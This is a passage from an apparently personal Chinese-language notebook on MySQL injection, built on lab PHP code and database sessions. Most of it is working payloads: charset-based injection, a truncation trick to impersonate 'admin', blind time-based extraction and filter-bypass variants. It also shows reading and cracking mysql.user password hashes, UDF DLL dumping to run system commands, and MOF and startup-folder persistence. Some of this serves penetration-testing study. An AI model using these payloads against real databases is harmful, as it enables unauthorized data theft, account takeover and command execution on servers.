    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
if (empty($_GET['username'])) {
    exit();
}
$username = $_GET['username'];
var_dump(urlencode($username));
$username = iconv('UTF-8', 'GBK', $username);
$username = addslashes($username);
var_dump(urlencode($username));
var_dump($username);
$query = "select * from user where username = '$username';";
$result = $db->query($query);
var_dump($result->fetch_all());
```

传入`錦`即`%e9%8c%a6`,在`UTF-8`转换为`GBK`后得到`%E5%5C`,造成了注入

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031427016.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031427066.png)

2. `GBK`转`UTF-8`

```
version: '3.8'
services:
  mysql44:
    image: mysql:5.5.44
    container_name: mysql-44
    ports:
      - "4400:3306"
    environment:
      MYSQL_ROOT_PASSWORD: root
    command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci
```

```
sql_injection_test> show variables like '%char%'
+--------------------------+----------------------------------+
| Variable_name            | Value                            |
+--------------------------+----------------------------------+
| character_set_client     | utf8                             |
| character_set_connection | utf8                             |
| character_set_database   | utf8                             |
| character_set_filesystem | binary                           |
| character_set_results    | utf8                             |
| character_set_server     | utf8mb4                          |
| character_set_system     | utf8                             |
| character_sets_dir       | /usr/local/mysql/share/charsets/ |
+--------------------------+----------------------------------+
8 rows in set
Time: 0.008s
```

```php
<?php
highlight_file(__FILE__);
$db = new mysqli("192.168.92.128", "root", "root", "sql_injection_test", "4400");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
if (empty($_GET['username'])) {
    exit();
}
$username = $_GET['username'];
var_dump(urlencode($username));
$username = addslashes($username);#注意这里addslashes提前了
$username = iconv('GBK', 'UTF-8', $username);
var_dump(urlencode($username));
var_dump($username);
$query = "select * from user where username = '$username';";
$result = $db->query($query);
var_dump($result->fetch_all());
```

传入`%e5%5c'`即`錦`的GBK编码加上一个`'`,经过`addslashes`得到`%e5%5c%5c`,经过`iconv`得到`%E9%8C%A6%5C%5C%27`,`%E9%8C%A6`被作为一个`UTF-8`字符即`錦`,而`%5C%5C%27`即`\\'`成功逃逸出`'`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031440631.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031440120.png)

`'error' => string 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''錦\\''' at line 1' (length=154)`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031441844.png)

### latin1编码注入

[Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)

```
version: '3.8'
services:
  mysql:
    image: mysql:5.5.44
    container_name: database
    ports:
      - "4000:3306"
    environment:
      MYSQL_ROOT_PASSWORD: root
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241612416.png)

```php
<?php
highlight_file(__FILE__);
$db = new mysqli("172.17.0.1", "root", "root", "test", "4000");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
$db->query("set names utf8");
$username = addslashes($_GET['username']);
if($username==='admin'){
    die();
}
var_dump($username);
$query = "select * from users where username = '$username';";
$result = $db->query($query);
var_dump($result->fetch_all());
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241651927.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241652096.png)

>转换出错原因:latin1不支持汉字
>
>截断原因:mysql所使用的UTF-8编码是阉割版的,仅支持三个字节的编码,而对于不完整的长字节UTF-8编码的字符,若进行字符集转换时,会直接进行忽略处理

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241700427.png)

以下字符不允许出现

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241701770.png)

因此只有`[7F-C0]`中的部分字符可以被利用

## 约束攻击

>利用mysql对空格的特殊处理来进行平行越权

>注意varchar长度

```
create table user
(
    id       int auto_increment,
    username varchar(10) null,
    password varchar(10) null,
    constraint user_pk
        primary key (id)
);
```

```
mysql root@localhost:sql_injection_test> select @@version;
+-----------+
| @@version |
+-----------+
| 5.5.47    |
+-----------+
1 row in set
Time: 0.008s

mysql root@localhost:sql_injection_test> select * from user;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | admin    | ASDFG12345 |
+----+----------+------------+
1 row in set
Time: 0.009s
```

```php
<?php
highlight_file(__FILE__);
$db = new mysqli("192.168.241.128", "root", "root", "sql_injection_test", "4700");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
if (empty($_POST['username']) || empty($_POST['password'])) {
    exit();
}
$username = mysqli_real_escape_string($db, $_POST['username']);
$password = mysqli_real_escape_string($db, $_POST['password']);
var_dump($username);
var_dump($password);
$query = "select * from user where username = '$username'";
$result = $db->query($query);
if ($result->fetch_row()) {
    die('已存在该用户');
} else {
    $query = "insert into user (`username`,`password`) values('$username','$password')";
    $db->query($query);
    die('注册成功');
}
```

```php
<?php
highlight_file(__FILE__);
$db = new mysqli("192.168.241.128", "root", "root", "sql_injection_test", "4700");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
if (empty($_POST['username']) || empty($_POST['password'])) {
    exit();
}
$username = mysqli_real_escape_string($db, $_POST['username']);
$password = mysqli_real_escape_string($db, $_POST['password']);
$query = "select * from user where username = '$username' and password='$password';";
$result = $db->query($query);
var_dump($result->fetch_row());
```

直接注册`admin`显然是不可以的,但是可以对`username`传入参数为`admin     a`

```
mysql root@localhost:sql_injection_test> select * from user where username="admin     a"
+----+----------+----------+
| id | username | password |
+----+----------+----------+
0 rows in set
Time: 0.009s
```

显然`admin     a`不存在数据库中,因此进行插入操作,而在进行插入操作时,由于字符串过长,mysql会对字符串进行截断后插入,字符串被截断为`admin     `(5个空格)然后进行插入操作

mysql对空格会特殊处理,具体表现在进行select操作时会忽略该字段的后面多余的空格,由此达到了平行越权的目的

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282045402.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282047581.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201282046916.png)

```
mysql root@localhost:sql_injection_test> select * from `user` where username='admin     ';
+----+------------+------------+
| id | username   | password   |
+----+------------+------------+
| 1  | admin      | ASDFG12345 |
| 2  | admin      | admin      |
+----+------------+------------+
2 rows in set
Time: 0.007s
mysql root@localhost:sql_injection_test> select * from `user`;
+----+------------+------------+
| id | username   | password   |
+----+------------+------------+
| 1  | admin      | ASDFG12345 |
| 2  | admin      | admin      |
+----+------------+------------+
2 rows in set
Time: 0.008s
```

## 无列名注入

1. union

```
mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2 as b,3,4 union select * from table1)a),3,4;
+----+-----------------------+----------+-----------------+
| id | username              | password | email           |
+----+-----------------------+----------+-----------------+
| 1  | admin                 | admin!@# | admin@admin.org |
| 1  | 2,admin,tim,mike,mike | 3        | 4               |
+----+-----------------------+----------+-----------------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2,3 as b,4 union select * from table1)a),3,4;
+----+-------------------------------------+----------+-----------------+
| id | username                            | password | email           |
+----+-------------------------------------+----------+-----------------+
| 1  | admin                               | admin!@# | admin@admin.org |
| 1  | 3,admin!@#,123456,asdfqwer,asdfqwer | 3        | 4               |
+----+-------------------------------------+----------+-----------------+
2 rows in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2,3,4 as b union select * from table1)a),3,4;
+----+------------------------------------------------------------+----------+-----------------+
| id | username                                                   | password | email           |
+----+------------------------------------------------------------+----------+-----------------+
| 1  | admin                                                      | admin!@# | admin@admin.org |
| 1  | 4,admin@admin.org,tim@qq.com,mike@gmail.com,mike@gmail.com | 3        | 4               |
+----+------------------------------------------------------------+----------+-----------------+
2 rows in set
Time: 0.008s
```

>分析

```
mysql root@localhost:sql_injection_test> select 1,2 as b,3,4 union select * from table1
+---+-------+----------+-----------------+
| 1 | b     | 3        | 4               |
+---+-------+----------+-----------------+
| 1 | 2     | 3        | 4               |
| 1 | admin | admin!@# | admin@admin.org |
| 2 | tim   | 123456   | tim@qq.com      |
| 3 | mike  | asdfqwer | mike@gmail.com  |
| 4 | mike  | asdfqwer | mike@gmail.com  |
+---+-------+----------+-----------------+
5 rows in set
Time: 0.008s
```

```
mysql root@localhost:sql_injection_test> select group_concat(b) from (select 1,2 as b,3,4 union select * from table1)a
+-----------------------+
| group_concat(b)       |
+-----------------------+
| 2,admin,tim,mike,mike |
+-----------------------+
1 row in set
Time: 0.008s
```

第一次联合查询构造一个列名为`1,b,3,4`的表,并且表中的数据来源于`table1`,第二次联合查询将该列读出来

2. union+order by

看前面的`order by`注入

3. join

>假定union被过滤

[MySQL JOIN 菜鸟教程](https://www.runoob.com/mysql/mysql-join.html)

通过`join`可建立两个表之间的内连接,通过对要查询列名的表与其自身进行内连接,会产生的相同列名,从而发生错误带出数据(即列名)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211800660.png)

`using()`用于两张表之间的`join`连接查询,并且`using()`中的列在两张表中都存在,由此剔除掉前一次注入时得到的列名

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211803273.png)

```
select * from(select * from table1 as a join table1 as b)c;
select * from(select * from table1 as a join table1 as b using (id))c;
select * from(select * from table1 as a join table1 as b using (id,username))c;
```

payload如下

`' and updatexml(1,(select * from(select * from table1 as a join table1 as b)c),1)#`

4. ascii

```
mysql root@localhost:sql_injection_test> select * from test;
+------+
| flag |
+------+
| abcd |
+------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'a')>(select * from test);
+-----------------------------------+
| (select 'a')>(select * from test) |
+-----------------------------------+
| 0                                 |
+-----------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'b')>(select * from test);
+-----------------------------------+
| (select 'b')>(select * from test) |
+-----------------------------------+
| 1                                 |
+-----------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'aa')>(select * from test);
+------------------------------------+
| (select 'aa')>(select * from test) |
+------------------------------------+
| 0                                  |
+------------------------------------+
1 row in set
Time: 0.009s
mysql root@localhost:sql_injection_test> select (select 'ab')>(select * from test);
+------------------------------------+
| (select 'ab')>(select * from test) |
+------------------------------------+
| 0                                  |
+------------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'ac')>(select * from test);
+------------------------------------+
| (select 'ac')>(select * from test) |
+------------------------------------+
| 1                                  |
+------------------------------------+
1 row in set
Time: 0.008s
```

```
mysql root@localhost:sql_injection_test> select (select 'abb')=substr((select * from test),1,3);
+-------------------------------------------------+
| (select 'abb')=substr((select * from test),1,3) |
+-------------------------------------------------+
| 0                                               |
+-------------------------------------------------+
1 row in set
Time: 0.008s
mysql root@localhost:sql_injection_test> select (select 'abc')=substr((select * from test),1,3);
+-------------------------------------------------+
| (select 'abc')=substr((select * from test),1,3) |
+-------------------------------------------------+
| 1                                               |
+-------------------------------------------------+
1 row in set
Time: 0.008s
```

## insert update delete注入

与`select`不同,没有数据直接回显,通常结合报错注入或延时注入

>insert注入会产生大量垃圾数据,delete注入要注意防止条件为永真

### update注入技巧

```
use test;
UPDATE users set name='admin',password=(select @@version) where id=1;
select * from users;
UPDATE users set name='admin',password=(select user()) where id=1;
select * from users;
```

![](https://img.mi3aka.eu.org/2022/09/9fff0c5654b31bb0e62e062f88ff1ded.png)

## False注入

[MySQL False注入及技巧总结](https://www.anquanke.com/post/id/86021)

>todo




# 过滤与替换

## information_schema被过滤

>某些表需要权限才能访问

1. `sys.schema_auto_increment_columns`

2. `sys.x$innodb_buffer_stats_by_table`

3. `sys.x$ps_schema_table_statistics_io`

4. `sys.schema_table_statistics_with_buffer`

5. `sys.x$schema_table_statistics_with_buffer`

6. `performance_schema.table_io_waits_summary_by_table`

7. `mysql.innodb_index_stats`

8. `mysql.innodb_table_stats`

## and与or被过滤

- 用`&&`和`||`代替

- 直接拼接数据

```
select id,username,password from users where id=1=1
select id,username,password from users where id=1=0
select id,username,password from users where id=1=updatexml(1,concat(0x7e,(select @@version),0x7e),1)

select id,username,password from users where id=1^1
select id,username,password from users where id=1^0
select id,username,password from users where id=1^updatexml(1,concat(0x7e,(select @@version),0x7e),1)
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241440545.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241442340.png)

## 空格被过滤

- 用`/*xxx*/`或者`+`(加号有使用限制)作为空格的替换

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131536800.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131537199.png)

- 特殊的ascii字符

```php
<?php
error_reporting(0);
$db = new mysqli("192.168.241.128", "root", "root", "mysql", "50547");
if (mysqli_connect_errno()) { #检查连接
    printf("Connect failed: %s\n", mysqli_connect_error());
    exit();
}
$str =$_GET['str'];
var_dump($str);
$result = $db->query($str);
if ($result->num_rows !== 0) {
    echo $result->fetch_row()[0];
}
```

```python
import time

import requests

url = 'http://192.168.2.2:8000/sql_injection_test/space.php'
url_char = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']

for i in url_char:
    for j in url_char:
        r = requests.get(url='http://192.168.2.2:8000/sql_injection_test/space.php?str=select%' + i + j + 'user();')
        if 'root@192.168.241.1' in r.text:
            print('%' + i + j)
    time.sleep(5)
```

```
%09
%0a
%0b
%0c
%0d
%20
%2b
%a0
```

- 用`()`和`{}`去闭合从而绕过空格的限制

>`{}`常用于语句变形

样例`select(user),(host)from(mysql.user);`

真实模拟

`select user,host from mysql.user where user='root'union(select(group_concat(schema_name)),(null)from(information_schema.schemata))#'`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131650473.png)

样例`select{x(user)},{x(host)}from{x(mysql.user)};`

真实模拟

`select user,host from mysql.user where user='root'union(select{x(group_concat(schema_name))},{x(null)}from{x(information_schema.schemata)})#'`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131742371.png)

- 在特定情况下,偶数个`!`或`~`可以代替空格

偶数个`!`进行多次逻辑非运算

偶数个`~`进行多次取反运算(不变)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241431617.png)

## 逗号被过滤

`select 1,2,3;`

`select * from((select 1)a join (select 2)b join (select 3)c);`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202131826535.png)

真实模拟

`select user,host,file_priv from mysql.user where user='root'union select * from ((select group_concat(schema_name) from information_schema.schemata)a join (select 1)b join (select 2)c)#'`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132047064.png)

`select id,info from table3 union select * from (select group_concat(user) from mysql.user)a join (select group_concat(host) from mysql.user)b;`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202151417672.png)

`mid`和`substr`是可以不使用`,`的

```
select substr('asdfgh',1,2)
select substr('asdfgh' from 1 for 2)
mid同理
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202151356999.png)

`limit`的逗号可以用`offset`进行替换

`select id,info from table3 limit 1 offset 0`

`select id,info from table3 limit 1 offset 1`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202151427591.png)

>假设逗号跟空格(包括替换字符)都不允许出现,同时目标不报错不回显

可以利用之前提到的裸sleep注入

`select user,host,file_priv from mysql.user where user='root'&&(sleep((select ascii(mid(group_concat(schema_name)from(1)for(1)))from(information_schema.schemata))>100))#'`

`select user,host,file_priv from mysql.user where user='root'&&(sleep((select ascii(mid(group_concat(schema_name)from(2)for(1)))from(information_schema.schemata))>100))#'`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202151402289.png)

---

`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'0'and'G'))#'`

`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'6'and'G'))#'`

`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'7'and'G'))#'`

```
mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'0'and'G'))#'
+------+------+-----------+
| user | host | file_priv |
+------+------+-----------+
0 rows in set
Time: 2.011s
mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'6'and'G'))#'
+------+------+-----------+
| user | host | file_priv |
+------+------+-----------+
0 rows in set
Time: 2.013s
mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'7'and'G'))#'
+------+------+-----------+
| user | host | file_priv |
+------+------+-----------+
0 rows in set
Time: 0.009s
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202132120052.png)

`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666E'and'696E666G'))#'`

`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666F'and'696E666G'))#'`

`select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666G'and'696E666G'))#'`

```
mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666E'and'696E666G'))#'
+------+------+-----------+
| user | host | file_priv |
+------+------+-----------+
0 rows in set
Time: 2.016s
mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666F'and'696E666G'))#'
+------+------+-----------+
| user | host | file_priv |
+------+------+-----------+
0 rows in set
Time: 2.009s
mysql root@localhost:(none)> select user,host,file_priv from mysql.user where user='root'&&(sleep((select(hex(group_concat(schema_name)))from(information_schema.schemata))between'696E666G'and'696E666G'))#'
+------+------+-----------+
| user | host | file_priv |
+------+------+-----------+
0 rows in set
Time: 0.010s
```

## if被过滤

使用`case when 条件 then 表达式1 else 表达式2 end`进行替换

>记得在最后添加`end`

[MySQL CASE Function](https://www.w3schools.com/sql/func_mysql_case.asp)

```
select id,username,password from users where username='asdf' and case when length(database())>5 then sleep(5) else 1 end
select id,username,password from users where username='asdf' and case when length(database())<5 then sleep(5) else 1 end
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241505008.png)

## 数字被过滤

[MySQL注入技巧](https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241515900.png)

在利用`version()`时要注意版本号

```
false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K
true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L
true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M
floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N
ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O
floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P
ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q
ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R
floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S
floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T
```

## 比较操作符/函数

```
<
>
=
!=
greatest()
least()
between xxx and xxx
like
rlike
regexp
```

## 常用函数过滤与替换

```
ascii -> ord
select ascii(/**/'1234'/**/);
select ord(/**/'1234'/**/);

substring((select 'password'),1,1) = 0x70
strcmp(left(‘password’,1), 0x69) = 1



/*替换表示字符串,但受限于36进制,只能够显示大写字符*/
select conv(binary('ASDF'),36,10);
select conv(503331,10,36);


```



## 报错注入时concat被过滤

在某一次渗透测试时,遇到了`concat`被过滤的情况,但不是单纯地过滤`concat`关键字,而是对`concat(xxx,xxx)`此种形式进行过滤

- 注入点测试

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204041212432.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204041212207.png)

- 使用`concat`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204041213952.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204041213661.png)

- 使用`make_set`

[https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_make-set](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_make-set)

`MAKE_SET(bits,str1,str2,...)`

返回一个集合值(一个包含由`,`字符分隔的子字符串的字符串),该值由在`bits`中设置了相应位的字符串组成,`str1`对应位`0`,`str2`对应位`1`,依此类推,NULL值不会附加到结果中

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204011125103.png)

bits将转为二进制,1的二进制为0000 0001,所以输出`a`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204011125143.png)

bits将转为二进制,2的二进制为0000 0010,所以输出`b`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204011126316.png)

bits将转为二进制,2的二进制为0000 0011,所以输出`a,b`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204041213575.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204041213792.png)

- 使用`lpad`或`rpad`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204041213215.png)

`resetPassword?mobile=13610001000'and+updatexml(1,rpad('~',30,(select version())),1)%23`

# 提权利用

[MySQL 漏洞利用与提权](https://www.sqlsec.com/2020/11/mysql.html)

## 读取mysql.user中的哈希

```
mysql<=5.6
select Host,User,Password from mysql.user;
mysql>=5.7
select Host,User,authentication_string from mysql.user;
```

![](https://img.mi3aka.eu.org/2022/09/86d44221183ba3ecf9591c3cbf73541e.png)

![](https://img.mi3aka.eu.org/2022/09/f7ba4f9de28b345e3fe93fc2662a12d8.png)

去cmd5反查

![](https://img.mi3aka.eu.org/2022/09/a7f6cc20502932a4eb0fdef0a8d6575b.png)

## UDF提权

[MySQL UDF 提权十六进制查询](https://www.sqlsec.com/udf/)

>UDF(user defind function)用户自定义函数,通过添加新函数,对MySQL的功能进行扩充

1. 判断是否有写入权限

`show variables like '%priv%';`

![](https://img.mi3aka.eu.org/2022/09/ef4c556ad923ceb758f0073f9ea20fd4.png)

![](https://img.mi3aka.eu.org/2022/09/219fe392d725695636419fd91c0feb28.png)

高版本的mysql会默认限制文件读写

2. 寻找插件目录

`show variables like '%plugin%';`

![](https://img.mi3aka.eu.org/2022/09/8ebb4562eb8f09f5560a31acb4f6303a.png)

3. 利用十六进制写入文件

![](https://img.mi3aka.eu.org/2022/09/467942ff004b62cb14d3319a9990e7d8.png)

![](https://img.mi3aka.eu.org/2022/09/55b29cc2bab8342acc50f1486c45eb98.png)

`SELECT 0x4d5a90000..000 INTO DUMPFILE 'C:\\MYSQL\\mysql-5.5.44\\lib\\plugin\\udf.dll';`

4. 创建自定义函数并调用命令

`CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';`

`select * from mysql.func`

`select sys_eval('whoami');`

![](https://img.mi3aka.eu.org/2022/09/166f09e53dfc9000101f9f4d04f06476.png)

![](https://img.mi3aka.eu.org/2022/09/f8d43d6c7c54dc5295c123f27e9b218d.png)

成功创建并调用

5. 删除自定义函数

`drop function sys_eval;`

## MOF提权

一般来说在windows server 2003上才能成功

提权的原理是`C:/Windows/system32/wbem/mof/`目录下的`mof`文件每隔一段时间都会被系统执行,利用文件中含有的`vbs`脚本来执行系统命令

## 启动项提权

向启动项目录中写入`vbs`或者`exe`文件,在用户登录/重启后执行

```
Windows Server 2003
# 中文系统
C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
C:\Documents and Settings\All Users\「开始」菜单\程序\启动

# 英文系统
C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
C:\Documents and Settings\All Users\Start Menu\Programs\Startup

# 开关机项 需要自己建立对应文件夹
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown

Windows Server 2008
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

# 未完待续...

